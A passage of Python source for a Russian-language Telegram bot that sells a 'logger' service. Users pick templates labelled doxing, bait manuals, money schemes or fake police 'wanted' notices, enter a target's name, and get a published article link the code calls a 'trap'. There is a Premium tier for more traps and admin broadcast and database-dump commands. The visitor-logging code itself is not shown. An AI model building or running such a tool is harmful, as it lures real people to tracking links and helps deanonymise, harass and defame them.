        try: bot.send_message(uid, message.text); ok += 1
        except: fail += 1
    bot.reply_to(message, f"✅Отправлено: {ok}, ошибок: {fail}")

@bot.callback_query_handler(func=lambda c: c.data == 'admin_stats' and c.from_user.id in ADMIN_IDS)
def cb_admin_stats(call):
    total, with_bal, premium = user_counts()
    bot.send_message(call.message.chat.id, f"<b>Стата:</b>\n👥Всего: {total}\n💰С балансом: {with_bal}\n💎Premium: {premium}")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_dump' and c.from_user.id in ADMIN_IDS)
def cb_admin_dump(call):
    try:
        with open(DB_PATH, 'rb') as f: bot.send_document(call.message.chat.id, f)
    except: pass
    bot.answer_callback_query(call.id)

# ---------- LOGGER ----------
@bot.callback_query_handler(func=lambda c: c.data == 'toggle_anon')
def cb_toggle_anon(call):
    uid = call.from_user.id
    current = get_setting(f"anon_{uid}", "0")
    set_setting(f"anon_{uid}", "0" if current == "1" else "1")
    bot.answer_callback_query(call.id, "✅ Обновлено!")
    cb_cabinet(call)

@bot.callback_query_handler(func=lambda c: c.data == 'logger')
def cb_logger(call):
    user = get_user_info(call.from_user.id)
    if user and user["frozen"]:
        return bot.answer_callback_query(call.id, "🧊 Аккаунт заморожен.", show_alert=True)
        
    if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
        if get_user_links_count(call.from_user.id) >= 5:
            return bot.answer_callback_query(call.id, "❌ Лимит 5 ловушек. Купи Premium!", show_alert=True)
        
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("📙 Д0xing", callback_data="cat_dox"))
    kb.add(types.InlineKeyboardButton("📙 Байты", callback_data="cat_bait"))
    kb.add(types.InlineKeyboardButton("📙 Розыски", callback_data="cat_wanted"))
    kb.add(types.InlineKeyboardButton("📙 Свой текст", callback_data="tpl_custom"))
    kb.add(types.InlineKeyboardButton("⭐️ Назад", callback_data="home"))
    
    with open('had2.jpg', 'rb') as had:
        bot.send_photo(call.message.chat.id, had, caption="<b>Выберите шаблон:</b>", reply_markup=kb)
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass
    bot.answer_callback_query(call.id)

TEMPLATES = {
    "tpl_dox_v1": "Dox V1", "tpl_dox_v2": "Dox V2", "tpl_dox_v3": "Dox V3", "tpl_dox_v4": "Dox V4",
    "tpl_man_v1": "Manual V1", "tpl_man_v2": "Manual V2", "tpl_mvd_v1": "МВД V1", "tpl_mvd_v2": "МВД V2",
    "tpl_sport_v1": "Спорт V1", "tpl_sport_v2": "Спорт V2", "tpl_money_v1": "Бабки V1", "tpl_money_v2": "Бабки V2",
}
TEXTS = {
    "tpl_dox_v1": "Данный человек {title}...", "tpl_dox_v2": "Данная личность {title}...",
    "tpl_dox_v3": "Д0КС {title}...", "tpl_dox_v4": "Такая личность {title}...",
    "tpl_man_v1": "Мануал от {title}...", "tpl_man_v2": "MANUAL от {title}...",
    "tpl_mvd_v1": "Разыскивается {title}...", "tpl_mvd_v2": "В розыск {title}...",
    "tpl_sport_v1": "Разыскивается {title}...", "tpl_sport_v2": "Задолжала {title}...",
    "tpl_money_v1": "Связка TikTok... {title}", "tpl_money_v2": "Крипто-пираты... {title}",
}

@bot.callback_query_handler(func=lambda c: c.data in ("cat_dox", "cat_bait", "cat_wanted"))
def cb_cat(call):
    kb = types.InlineKeyboardMarkup(row_width=1)
    if call.data == "cat_dox": keys = ("tpl_dox_v1", "tpl_dox_v2", "tpl_dox_v3", "tpl_dox_v4")
    elif call.data == "cat_bait": keys = ("tpl_man_v1", "tpl_man_v2", "tpl_money_v1", "tpl_money_v2")
    else: keys = ("tpl_mvd_v1", "tpl_mvd_v2", "tpl_sport_v1", "tpl_sport_v2")
    for k in keys: kb.add(types.InlineKeyboardButton(TEMPLATES[k], callback_data=k))
    kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="logger"))
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption="<b>Шаблоны:</b>", reply_markup=kb)
    bot.answer_callback_query(call.id)

_pending = {}

@bot.callback_query_handler(func=lambda c: c.data in TEMPLATES)
def cb_template(call):
    _pending[call.from_user.id] = call.data
    bot.send_message(call.message.chat.id, "<b>Введите ник/имя:</b>")
    bot.register_next_step_handler(call.message, _ask_img)
    bot.answer_callback_query(call.id)

def _ask_img(message):
    if message.text.startswith('/'):
        bot.send_message(message.chat.id, "❌ Создание отменено.")
        return show_main_menu(message.chat.id)
    key = _pending.get(message.from_user.id)
    if not key: return
    title = message.text.strip()[:80]
    _pending[message.from_user.id] = (key, title)
    bot.send_message(message.chat.id, "<b>URL картинки (или /skip):</b>")
    bot.register_next_step_handler(message, _make_step)

def _make_step(message):
    data = _pending.pop(message.from_user.id, None)
    if not data: return
    key, title = data
    img = None if message.text.strip() == "/skip" else message.text.strip()
    text = TEXTS[key].format(title=title)
    username = message.from_user.username or str(message.from_user.id)
    msg, url, slug = make_article(title, text, img, TEMPLATES[key], message.from_user.id, username)
    bot.send_message(message.chat.id, msg)

@bot.callback_query_handler(func=lambda c: c.data == "tpl_custom")
def cb_custom(call):
    bot.send_message(call.message.chat.id, "<b>Введите заголовок:</b>")
    bot.register_next_step_handler(call.message, _cust_title)
    bot.answer_callback_query(call.id)

_custom = {}

def _cust_title(message):
    if message.text.startswith('/'):
        bot.send_message(message.chat.id, "❌ Создание отменено.")
        return show_main_menu(message.chat.id)
    _custom[message.from_user.id] = {"title": message.text.strip()[:80]}
    bot.send_message(message.chat.id, "<b>Введите текст:</b>")
    bot.register_next_step_handler(message, _cust_text)

def _cust_text(message):
    _custom[message.from_user.id]["text"] = message.text
    bot.send_message(message.chat.id, "<b>URL картинки (или /skip):</b>")
    bot.register_next_step_handler(message, _cust_img)

def _cust_img(message):
    d = _custom.pop(message.from_user.id, None)
    if not d: return
    img = None if message.text.strip() == "/skip" else message.text.strip()
    username = message.from_user.username or str(message.from_user.id)
    msg, url, slug = make_article(d["title"], d["text"], img, "custom", message.from_user.id, username)
    bot.send_message(message.chat.id, msg)

# ---------- ENTRY ----------
if __name__ == "__main__":
    db_init()
    threading.Thread(target=run_webhook, daemon=True).start()
    print("[*] bot polling…")
    bot.infinity_polling()
